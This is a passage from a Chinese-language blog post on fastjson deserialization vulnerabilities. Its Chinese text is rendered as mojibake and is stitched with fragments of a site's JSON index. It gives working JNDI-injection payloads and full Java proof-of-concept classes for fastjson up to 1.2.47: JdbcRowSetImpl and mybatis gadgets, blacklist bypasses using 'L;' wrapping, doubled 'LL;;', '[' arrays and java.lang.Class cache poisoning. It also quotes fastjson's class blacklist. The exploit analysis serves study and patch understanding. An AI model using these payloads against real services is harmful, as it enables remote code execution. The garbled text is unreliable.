\u0026#34;\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/hello\\\u0026#34;,\u0026#34; + \u0026#34;\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;}\u0026#34;; deserialize(payload); } public static void deserialize(String json) throws Exception { ParserConfig parserConfig = new ParserConfig(); Object obj = JSON.parseObject(json, Object.class, parserConfig, Feature.SupportNonPublicField); } } æ³¨æ„è¿™é‡Œçš„rmiæœåŠ¡å°±æ˜¯æˆ‘ä»¬JNDIæ³¨å…¥ä½¿ç”¨çš„serverï¼Œè¿è¡Œåå‘ç°æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š\næˆ‘ä»¬çœ‹payloadå°±å·²ç»çŸ¥é“è¿™é‡Œæ˜¯æ‰“äº†ä¸€ä¸ªJNDIæ³¨å…¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆè¿™ä¸ªJdbcRowSetå¯ä»¥è§¦å‘JNDI\nJNDIæŸ¥è¯¢è‚¯å®šæ˜¯ä»lookupå‡½æ•°è§¦å‘ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸‹å‘ç°åœ¨connect()æ–¹æ³•ä¸­ï¼š ç„¶åæ‰¾è°ƒç”¨connect()å‡½æ•°çš„åœ°æ–¹ï¼Œå‘ç°ä¸€ä¸ªgetterå’Œä¸€ä¸ªsetterï¼š å¾ˆæ˜æ˜¾è¿™é‡Œåœ¨ååºåˆ—åŒ–æ—¶æ— æ³•è°ƒç”¨getterï¼Œæ‰€ä»¥é‡ç‚¹çœ‹è¿™ä¸ªsetterï¼Œåœ¨connä¸ºnullæ—¶è§¦å‘connectï¼Œåœ¨fastjsonä¸­ï¼Œå®ä¾‹åŒ–ç±»æ—¶æ˜¯è°ƒç”¨çš„newInstance()ï¼Œä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼š è¿™é‡Œä¼šå°†connè®¾ç½®ä¸ºnullï¼Œæ²¡æ¯›ç—…ï¼Œé‚£å†çœ‹çœ‹connect()éœ€è¦çš„å‚æ•°ï¼š\næˆ‘ä»¬éœ€è¦æ§åˆ¶è¿™ä¸ªgetDataSourceName()çš„å€¼ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š\nå‘ç°æ˜¯è¿”å›çš„çˆ¶ç±»BaseRowSetçš„ä¸€ä¸ªå˜é‡ï¼Œå¹¶ä¸”çˆ¶ç±»å­˜åœ¨setteræ–¹æ³•æ¥è¿›è¡Œèµ‹å€¼ï¼š\né‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºå¯¹åº”çš„jsonï¼š\n{ \u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/hello\u0026#34;, \u0026#34;autoCommit\u0026#34;:\u0026#34;true\u0026#34; } è¿™é‡Œå°±å’Œä¸Šé¢çš„demoä¸€æ ·äº†\n1.2.25\u0026lt;=fastjson\u0026lt;=1.2.41 ååºåˆ—åŒ– ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨fastjsonè‡ªçˆ†1.2.24ç‰ˆæœ¬çš„ååºåˆ—åŒ–æ¼æ´åï¼Œ1.2.25ç‰ˆæœ¬å°±åŠ å…¥äº†é»‘ç™½åå•æœºåˆ¶ï¼Œ ä¾‹å¦‚æˆ‘ä»¬æ›´æ¢å¹¶ä¸‹è½½1.2.25ç‰ˆæœ¬çš„fastjsonï¼Œç„¶åå†å»æ‰§è¡ŒåŸæ¥çš„pocï¼š\nå‘ç°å·²ç»æ— æ³•å‘½ä»¤æ‰§è¡Œäº†ï¼Œå¹¶ä¸”æŠ¥é”™autoType is not support\næˆ‘ä»¬é€šè¿‡æŸ¥çœ‹æºç å¯ä»¥å‘ç°æ·»åŠ äº†é»‘åå•ï¼š\né»‘åå•å†…å®¹å¦‚ä¸‹ï¼š\nbsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework è¿™å°±å¯¼è‡´æˆ‘ä»¬å‰é¢çš„payloadéƒ½å¤±æ•ˆäº†\nç»§ç»­å‘ä¸‹å®šä½åˆ°CheckAutoTypeï¼š\næˆ‘ä»¬çœ‹è¿™é‡Œçš„é€»è¾‘ï¼Œå¦‚æœå¼€å¯äº†autoTypeï¼Œé‚£ä¹ˆå°±å…ˆåˆ¤æ–­ç±»ååœ¨ä¸åœ¨ç™½åå•ä¸­ï¼Œå¦‚æœåœ¨å°±ç”¨TypeUtils.loadClassåŠ è½½ï¼Œå¦‚æœä¸åœ¨å°±å»åŒ¹é…é»‘åå•\nç»§ç»­å¾€ä¸‹èµ°ï¼š\nå¦‚æœæ²¡å¼€å¯autoTypeï¼Œåˆ™å…ˆåŒ¹é…é»‘åå•ï¼Œç„¶åå†ç™½åå•åŒ¹é…å’ŒåŠ è½½\næœ€åï¼Œå¦‚æœè¦ååºåˆ—åŒ–çš„ç±»å’Œé»‘ç™½åå•éƒ½æœªåŒ¹é…æ—¶ï¼Œåªæœ‰å¼€å¯äº†autoTypeæˆ–è€…expectClassä¸ä¸ºç©ºä¹Ÿå°±æ˜¯æŒ‡å®šäº†Classå¯¹è±¡æ—¶æ‰ä¼šè°ƒç”¨TypeUtils.loadClassåŠ è½½ï¼Œå¦åˆ™fastjsonä¼šé»˜è®¤ç¦æ­¢åŠ è½½è¯¥ç±»ï¼š\næˆ‘ä»¬çœ‹è¿™ä¸ªTypeUtilsçš„loadclass()æ–¹æ³•ï¼š\nè¿™é‡Œçš„ä»£ç é€»è¾‘æ˜¯ï¼šå¦‚æœç±»åçš„å­—ç¬¦ä¸²ä»¥[å¼€å¤´ï¼Œå°±æ˜¯@typeé”®çš„å€¼ä»¥[å¼€å¤´ï¼Œåˆ™è¯´æ˜è¯¥ç±»æ˜¯ä¸€ä¸ªæ•°ç»„ç±»å‹ï¼Œå°±ä½¿ç”¨substringæ–¹æ³•æ¥æˆªæ–­è·å–[åé¢çš„æ–¹æ³•ï¼Œç„¶åå†æ¬¡è°ƒç”¨loadClass()æ–¹æ³•æ¥åŠ è½½éœ€è¦é€’å½’è°ƒç”¨loadClassæ–¹æ³•æ¥åŠ è½½æ•°ç»„å…ƒç´ ç±»å‹å¯¹åº”çš„Classå¯¹è±¡ï¼Œç„¶åä½¿ç”¨Array.newIntranceæ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„å¯¹è±¡ï¼Œæœ€åè¿”å›è¯¥æ•°ç»„å¯¹è±¡çš„Classå¯¹è±¡ï¼›å¦‚æœç±»åçš„å­—ç¬¦ä¸²ä»¥Lå¼€å¤´å¹¶ä»¥;ç»“å°¾ï¼Œåˆ™è¯´æ˜è¯¥ç±»æ˜¯ä¸€ä¸ªæ™®é€šçš„Javaç±»ï¼Œéœ€è¦æŠŠå¼€å¤´çš„Lå’Œç»“å°¾çš„;ç»™å»æ‰ï¼Œç„¶åé€’å½’è°ƒç”¨loadClass\né—®é¢˜å°±å‡ºç°åœ¨è¿™é‡Œï¼Œå¯ä»¥é’ˆå¯¹è¿™ä¸ªé€»è¾‘è¿›è¡Œç»•è¿‡ï¼š æˆ‘ä»¬éœ€è¦å…ˆå¼€å¯é»˜è®¤ç¦ç”¨çš„autoTypeï¼š\nParserConfig.getGlobalInstance().setAutoTypeSupport(true); æ¥ä¸‹æ¥å°±æ˜¯æ„é€ POCäº†ï¼Œåˆ†æäº†ä¸Šé¢çš„é€»è¾‘å°±çŸ¥é“å¯ä»¥ç”¨Lå’Œåˆ†å·æ¥bypassï¼š\n{ \u0026#34;@type\u0026#34;:\u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/hello\u0026#34;, \u0026#34;autoCommit\u0026#34;:\u0026#34;true\u0026#34; } é‚£ä¹ˆæ•´ä½“çš„ä»£ç å¦‚ä¸‹ï¼š\npackage com.yuy0ung.fastjson1_2_25; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class FastJson_Demo { public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\\\u0026#34;,\\n\u0026#34; + \u0026#34;\\t\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/hello\\\u0026#34;,\\n\u0026#34; + \u0026#34;\\t\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;\\n\u0026#34; + \u0026#34;}\u0026#34;; deserialize(payload); } public static void deserialize(String json) throws Exception { Object obj = JSON.parseObject(json, Object.class, Feature.SupportNonPublicField); } } è¿è¡ŒæˆåŠŸååºåˆ—åŒ–è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\nä¹Ÿå¯ä»¥ç”¨[æ¥ç»•è¿‡ï¼š\n{ \u0026#34;@type\u0026#34;:\u0026#34;[com.sun.rowset.JdbcRowSetImpl\u0026#34;[{, \u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/hello\u0026#34;, \u0026#34;autoCommit\u0026#34;:\u0026#34;true\u0026#34; } åŒæ ·èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š fastjson 1.2.42 ååºåˆ—åŒ– å‰é¢æåˆ°çš„æ•°ç»„payloadä¸å—å½±å“ä»ç„¶èƒ½æ‰“ï¼š\npackage com.yuy0ung.fastjson1_2_42; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class FastJson_Demo2 { public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.rowset.JdbcRowSetImpl\\\u0026#34;[{,\\n\u0026#34; + \u0026#34;\\t\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/hello\\\u0026#34;,\\n\u0026#34; + \u0026#34;\\t\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;\\n\u0026#34; + \u0026#34;}\u0026#34;; deserialize(payload); } public static void deserialize(String json) throws Exception { Object obj = JSON.parseObject(json, Object.class, Feature.SupportNonPublicField); } } ä½†æ˜¯Lå’Œåˆ†å·çš„payloadä¸è¡Œäº†ï¼š\nè¿™é‡Œåˆè¯´ä¸æ”¯æŒè¿™ä¸ªç±»ï¼Œå¤šåŠæ˜¯é»‘åå•é€»è¾‘æ”¹äº†ï¼Œåˆ†æä¸€ä¸‹å¯ä»¥çœ‹åˆ°é»‘åå•å˜æˆäº†å“ˆå¸Œå€¼ï¼š è¿™é‡Œå¯¹é¦–å­—ç¬¦å’Œå°¾å­—ç¬¦åšä¸€æ¬¡ç®€åŒ–ç‰ˆ FNV-1a é£æ ¼çš„å“ˆå¸Œè¿ç®—æ¥çœ‹æœ‰æ²¡æœ‰Lå¼€å¤´å’Œåˆ†å·ç»“å°¾ï¼Œæœ‰çš„è¯å°±æˆªå–åä¼ ç»™ä¸‹ä¸€æ­¥çš„æ£€éªŒï¼š\nç„¶åç”¨hashæ¥æ£€éªŒé»‘åå•ï¼š\nå…¶å®å¾ˆå¥½æƒ³åˆ°ï¼Œä¸Šé¢å¯¹å¤´å°¾çš„æ£€æµ‹åªåšäº†ä¸€æ¬¡ï¼Œè€Œæœ€åloadclassçš„é€»è¾‘æ˜¯é€’å½’è°ƒç”¨æ¥å¾ªç¯å»é™¤Lå’Œåˆ†å·ï¼š\næ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå¯ä»¥åŒå†™Lå’Œ;è¿›è¡Œç»•è¿‡ï¼š\npackage com.yuy0ung.fastjson1_2_42; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class FastJson_Demo { public static void main(String[] args) throws Exception { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;LLcom.sun.rowset.JdbcRowSetImpl;;\\\u0026#34;,\\n\u0026#34; + \u0026#34;\\t\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/hello\\\u0026#34;,\\n\u0026#34; + \u0026#34;\\t\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34;\\n\u0026#34; + \u0026#34;}\u0026#34;; deserialize(payload); } public static void deserialize(String json) throws Exception { Object obj = JSON.parseObject(json, Object.class, Feature.SupportNonPublicField); } } å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œï¼š ç›¸å½“äºè¿™é‡Œçš„æ£€éªŒåªå»é™¤ä¸€æ¬¡ï¼Œè€Œloadclassèƒ½å»é™¤ä¸¤æ¬¡å†åŠ è½½ï¼Œæ—¢ç„¶è¿™æ ·ï¼Œå†™å¤šå°‘æ¬¡å…¶å®éƒ½èƒ½å»é™¤ï¼š\nfastjson 1.2.43 ååºåˆ—åŒ– æ•°ç»„ä»ç„¶å¯è¡Œï¼š\nä½†æ˜¯åŒå†™å¤±è´¥äº†ï¼š çœ‹çœ‹ä¿®å¤æ–¹æ³•ï¼š\nç›´æ¥ä¸¤æ¬¡ifï¼Œå¦‚æœå­˜åœ¨åŒå†™ç›´æ¥è¾“å‡ºä¸æ”¯æŒï¼Œé‚£æ²¡åŠæ³•ï¼Œåªèƒ½æ‰“æ•°ç»„çš„ç»•è¿‡äº†\nfastjson 1.2.44 åœ¨è¿™ä¸ªç‰ˆæœ¬ï¼Œæ•°ç»„çš„ç»•è¿‡ä¹Ÿè¢«ä¿®å¤äº†ï¼š ä¿®å¤æ–¹æ³•å°±æ˜¯å¢åŠ åˆ¤æ–­ï¼š\nç¬¬ä¸€ä¸ªifåˆ¤æ–­å¼€å¤´æ˜¯å¦ä¸º[ï¼Œç¬¬äºŒä¸ªifåˆ¤æ–­é¦–å°¾æ˜¯ä¸æ˜¯Lå’Œ;ï¼Œè¿™é‡Œå°±æŠŠä¸¤ç§bypasså®Œå…¨ä¿®å¤äº†\n1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.45 ååºåˆ—åŒ– è¿™ä¸ªç‰ˆæœ¬å­˜åœ¨ç»„ä»¶é»‘åå•ç»•è¿‡ï¼Œå¹¶æ²¡æœ‰ç¦ç”¨mybatisçš„ä¸€ä¸ªç»„ä»¶ï¼Œæ‰€ä»¥å®é™…1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.45ç‰ˆæœ¬éƒ½å­˜åœ¨\né¦–å…ˆæ·»åŠ ä¾èµ–ï¼š\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; payloadä¹Ÿå¾ˆæ˜äº†ï¼Œä¸€çœ‹å°±æ‡‚ï¼š\n{ \u0026#34;@type\u0026#34;:\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\u0026#34;, \u0026#34;properties\u0026#34;:{ \u0026#34;data_source\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/hello\u0026#34; } } å¯ä»¥è§¦å‘å¯¹åº”ç±»çš„setterçš„lookupæ–¹æ³•ï¼š\nåˆ©ç”¨jndiæ³¨å…¥åˆ°å‘½ä»¤æ‰§è¡Œï¼š\n1.2.25 \u0026lt;= fastjson \u0026lt;= 1.2.47 ååºåˆ—åŒ– è¿™æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„åˆ©ç”¨æ–¹æ³•ï¼Œç”šè‡³ä¸éœ€è¦ParserConfig.getGlobalInstance().setAutoTypeSupport(true)æ¥å¼€å¯autoType\nå…ˆçœ‹POCï¼š\n{ \u0026#34;a\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; }, \u0026#34;b\u0026#34;:{ \u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://127.0.0.1/exp\u0026#34;, \u0026#34;autoCommit\u0026#34;:true } } æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªè¿›è¡Œfastjsonååºåˆ—åŒ–ï¼Œå¯ä»¥æˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\nåˆ†æPOCä¼šå‘ç°ï¼Œå¤–é¢åˆå¥—äº†ä¸€ä¸ªjsonï¼Œå¹¶ä¸”åŠ äº†ä¸€ä¸ª{\u0026quot;@type\u0026quot;:\u0026quot;java.lang.Class\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;}ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆèƒ½å¤Ÿç»•è¿‡\né¦–å…ˆè¿˜æ˜¯çœ‹checkAutoType()ï¼š\næˆ‘ä»¬é‡ç‚¹çœ‹æœªå¼€å¯autoTypeæ—¶çš„æ“ä½œï¼Œé¦–å…ˆæ˜¯getClassFromMappingï¼Œåœ¨mappingä¸­è·å–classï¼š\nå¦‚æœä¸è¡Œå°±æ˜¯ç¬¬äºŒç§æ–¹æ³•ï¼Œä»deserializersä¸­è·å–ï¼š\nä½†æ˜¯deserializersæ˜¯privateç±»å‹çš„ï¼Œè™½ç„¶å½“å‰ç±»é‡Œé¢æœ‰ä¸€ä¸ªpublicçš„putDeserializeræ–¹æ³•ï¼Œä½†åªæœ‰ä¸€ä¸ªåœ°æ–¹è°ƒç”¨äº†ï¼Œæ²¡æ³•æ„æˆè°ƒç”¨é“¾ï¼Œæ‰€ä»¥é‡ç‚¹å…³æ³¨è¿™ä¸ªåŒæ ·privateç±»å‹çš„mappingï¼Œè€Œåœ¨TypeUtils.loadClassä¸­æœ‰è°ƒç”¨åˆ°mappings.putï¼š\nç»è¿‡æŸ¥æ‰¾å‘ç°MiscCodec.deserialzeè°ƒç”¨äº†TypeUtils.loadClassï¼š\nè€ŒstrValå˜é‡æ˜¯é€šè¿‡objValå˜é‡å¼ºè½¬æ¥çš„ï¼š\nè€ŒobjValåˆ™æ˜¯é€šè¿‡è°ƒç”¨Default#parse()æ–¹æ³•è·å–çš„ï¼š\næˆ‘ä»¬çœ‹ä¸‹ä¹‹å‰çš„deserializersä¸­å“ªé‡Œè°ƒç”¨äº†MiscCodecï¼š\nè¿™é‡Œæ˜¯æ”¾å…¥äº†ä¸€ä¸ªClass.classçš„é”®ï¼Œæ‰€ä»¥ç»“åˆå‰é¢çš„åˆ†æï¼Œå½“æˆ‘ä»¬æ­£å¸¸ååºåˆ—åŒ–æ—¶ï¼Œæ˜¯ä¼šè·å–deserializerå¹¶è°ƒç”¨å®ƒçš„deserialze()æ–¹æ³•ï¼Œæ‰€ä»¥å¯¹åº”çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°è¯•ä¼ å…¥Class.classï¼Œä»è€Œè·å–åˆ°MiscCodecç±»å®ä¾‹ï¼Œä»è€Œè°ƒç”¨åˆ°å®ƒçš„deserialze()æ–¹æ³•ï¼Œä»è€Œå¾€mappingsä¸­æ”¾å…¥æƒ³è¦åˆ©ç”¨çš„ç±»ï¼Œä»è€Œåœ¨ç›´æ¥åœ¨åç»­ä¸­è·å¾—æƒ³è¦çš„ç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„payloadå°±å‡ºæ¥äº†ï¼Œjsonå°±åƒå‰é¢çš„demoé‚£æ ·æ„é€ ï¼š\npackage com.yuy0ung.fastjson1_2_47; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; public class FastJson_Demo { public static void main(String[] args) throws Exception { String payload = \u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;a\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;\\n\u0026#34; + \u0026#34; },\\n\u0026#34; + \u0026#34; \\\u0026#34;b\\\u0026#34;:{\\n\u0026#34; + \u0026#34; \\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/hello\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;autoCommit\\\u0026#34;:true\\n\u0026#34; + \u0026#34; }\\n\u0026#34; + \u0026#34;}\u0026#34;; deserialize(payload); } public static void deserialize(String json) throws Exception { Object obj = JSON.parseObject(json, Object.class, Feature.SupportNonPublicField); } } æ€»ç»“ä¸€ä¸‹ï¼š\n1.2.47ç‰ˆæœ¬é»˜è®¤ä¸å¼€å¯AutoTypeï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•å‘mappingæˆ–serializeræ·»åŠ ç±»ï¼Œå¯»æ‰¾ç›¸å…³å¯æ§æ–¹æ³•ï¼Œæœ€åå†³å®šåˆ©ç”¨loadClassæ–¹æ³•å‘mappingä¸­æ·»åŠ ç±»\næƒ³è¦è°ƒç”¨å¯¹åº”çš„loadClassæ–¹æ³•ï¼Œéœ€è¦è°ƒç”¨MiscCodec#deserialzeæ–¹æ³•ï¼Œä¸”éœ€è¦clazzä¸ºClass.classç±»å‹ã€‚å…¶æ¬¡è¿˜éœ€è¦æ§åˆ¶æˆ‘ä»¬æ·»åŠ çš„ç±»åä¸ºstrValï¼Œä¸æ–­å¾€å‰å›æº¯ï¼Œå³valå˜é‡çš„å€¼ã€‚\næƒ³è¦è°ƒç”¨MiscCodec#deserialzeæ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦å¯¹fastjsonè§£æjsonæœ‰ä¸€å®šäº†è§£ï¼Œå¯¹äºdeserialzeæ–¹æ³•é€šå¸¸ä¼šåœ¨DefaultJSONParserç±»ä¸­è¢«è°ƒç”¨ï¼Œæ‰€é€‰å–çš„å¯¹è±¡åˆ™æ˜¯é€šè¿‡getDeserializeræ–¹æ³•è·å–\nç”±äºæˆ‘ä»¬è¦åˆ©ç”¨çš„æ˜¯java.lang.Classï¼Œè€Œæ°å¥½deserializersåˆç¼“å­˜Class.classï¼Œä¸”Valueæ­£æ˜¯MiscCodecå¯¹è±¡ï¼ŒgetDeserializeræ–¹æ³•æ­£æ˜¯è·å–keyæ‰€å¯¹åº”çš„value\nç„¶åå°±æ˜¯é€šè¿‡æ„é€ å¦‚ä¸‹jsonï¼Œé€šè¿‡è°ƒç”¨MiscCodec#deserialzeæ–¹æ³•å°†æ¶æ„å¯¹è±¡çš„åå­—åŠ è¿›mappingä¸­ï¼ŒåŠ è½½åˆ°mappingä¸­ä»¥åï¼Œåœ¨ä¸‹ä¸€æ¬¡checkAutoTypeçš„æ—¶å€™ï¼Œç›´æ¥å°±è¿”å›äº†ï¼Œç»•è¿‡äº†æ£€éªŒçš„éƒ¨åˆ†ç›´æ¥æ‰§è¡Œ\nfastjson 1.2.68 ååºåˆ—åŒ– fastjson 1.2.47çš„æ—¶å€™çˆ†å‡ºæ¥çš„è¿™ä¸ªç¼“å­˜çš„æ¼æ´å¾ˆä¸¥é‡ï¼Œå®˜æ–¹åœ¨1.2.48çš„æ—¶å€™å°±è¿›è¡Œäº†é™åˆ¶ï¼Œç›´åˆ°1.2.68\næˆ‘ä»¬çœ‹ä¸‹MiscCodecä¸Šé¢ï¼Œè¿™é‡Œçš„cacheè®¾ç½®ä¸ºäº†falseï¼š è€ŒloadClassé‡è½½æ–¹æ³•çš„é»˜è®¤çš„è°ƒç”¨æ”¹ä¸ºä¸ç¼“å­˜ï¼š\nfastjson 1.2.68è¿˜æœ‰ä¸€ä¸ªäº®ç‚¹å°±æ˜¯æ›´æ–°äº†ä¸ªsafeModeï¼š\nå¦‚æœå¼€å¯äº†safeModeï¼Œé‚£ä¹ˆautoTypeå°±ä¼šè¢«å®Œå…¨ç¦æ­¢ã€‚ ä½†æ˜¯ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰äº†ä¸ªæ–°çš„ç»•è¿‡æ–¹å¼ï¼šexpectClassï¼Œæˆ‘ä»¬å›åˆ°checkAutoTypeï¼Œå‘ç°åŒæ—¶æ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥ç»•è¿‡checkAutoTypeï¼š\nexpectClassä¸ä¸ºnullï¼Œä¸”ä¸ç­‰äºObject.classã€Serializable.classã€Cloneable.classã€Closeable.classã€EventListener.classã€Iterable.classã€Collection.classï¼›1 expectClasséœ€è¦åœ¨ç¼“å­˜é›†åˆTypeUtils#mappingsä¸­ï¼› expectClasså’ŒtypeNameéƒ½ä¸åœ¨é»‘åå•ä¸­ï¼› typeNameä¸æ˜¯ClassLoaderã€DataSourceã€RowSetçš„å­ç±»ï¼› typeNameæ˜¯expectClassçš„å­ç±»ã€‚ ",
        "summary": "Fastjsonååºåˆ—åŒ–æ¼æ´ fastjsonç®—æ˜¯å›½å†…ç”¨çš„æ¯”è¾ƒå¤šçš„ä¸€ä¸ªç»„ä»¶äº†ï¼Œå®ƒçš„ååºåˆ—åŒ–æ¼æ´ä¹Ÿæ˜¯ç»å…¸ä¸­çš„ç»å…¸\nFastjsonåŸºç¡€ ç®€å•ä½¿ç”¨ Fastjson æ˜¯é˜¿é‡Œå¼€æºçš„ Java JSON åº“ï¼Œå·ç§°â€œJava æœ€å¿« JSON è§£æ/ç”Ÿæˆå™¨â€ï¼Œä½œç”¨å°±æ˜¯ æŠŠ Java å¯¹è±¡ â†” JSON å­—ç¬¦ä¸² äº’ç›¸è½¬æ¢ï¼Œè®©ç½‘ç»œä¼ è¾“ã€æŒä¹…åŒ–ã€å‰åç«¯äº¤äº’æ›´ç®€å•ï¼Œè¿™ä¸ªè½¬æ¢è¿‡ç¨‹ä¹Ÿå°±ç›¸å½“äºæˆ‘ä»¬å¸¸è¯´çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–äº†\næˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªdemoçœ‹çœ‹ï¼Œé¦–å…ˆæ·»åŠ ä¾èµ–ï¼š\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.50\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; æ¥ä¸‹æ¥æ˜¯demoä»£ç ï¼Œå…¶ä¸­ç»™å‡ºäº†ä¸€ä¸ªjavaå¯¹è±¡ï¼Œä¸€ä¸ªjsonå­—ç¬¦ä¸²ï¼Œç„¶åå°†ä»–ä»¬ç”¨fastjsonçš„ç»„ä»¶æ¥è½¬æ¢ï¼š\npackage com.yuy0ung; import com.alibaba.fastjson.JSON; public class FastJsonDemo { public static void main(String[] args) { // å°†ä¸€ä¸ª Java å¯¹è±¡åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸² Person person = new Person(\u0026#34;Yuy1ung\u0026#34;, 18); String jsonString = JSON.toJSONString(person); System.out.println(jsonString); // å°†ä¸€ä¸ª JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ String jsonString2 = \u0026#34;{\\\u0026#34;age\\\u0026#34;:20,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;Yuy0ung\\\u0026#34;}\u0026#34;; Person person2 = JSON.parseObject(jsonString2, Person.class); System.out.println(person2.getName() + \u0026#34;, \u0026#34; + person2.getAge()); } // å®šä¹‰ä¸€ä¸ªç®€å•çš„ Java ç±» public static class Person { private String name; private int age; public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public int getAge() { return age; } } } è¿è¡Œåå¯ä»¥çœ‹åˆ°Java å¯¹è±¡åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼ŒJSON å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ï¼š\n"
    }
,
    {
        "title": "ginæ¡†æ¶",
